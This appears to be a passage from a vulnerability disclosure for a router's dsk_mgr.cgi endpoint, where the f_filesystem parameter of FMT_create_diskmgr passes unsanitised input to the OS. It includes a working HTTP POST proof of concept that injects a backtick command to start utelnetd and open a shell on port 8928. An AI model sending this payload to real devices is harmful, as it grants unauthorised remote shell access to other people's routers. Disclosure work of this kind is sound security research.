...
In `FMT_create_diskmgr` function, `f_filesystem、f_sethdsize` is directly passed by the attacker, so we can control the `f_filesystem、f_sethdsize` to attack the OS.
...
We set `f_filesystem` as **`utelnetd -p 8928 -l /bin/sh`** , and the router will excute it,such as:

```http
POST /cgi-bin/dsk_mgr.cgi HTTP/1.1
Host: 192.168.0.32
...
cmd=FMT_create_diskmgr&f_filesystem=`utelnetd -p 8928 -l /bin/sh`&f_sethdsize=&f_auto_sync=&f_raidlevel=standard&f_web=&f_create_jbod=
```
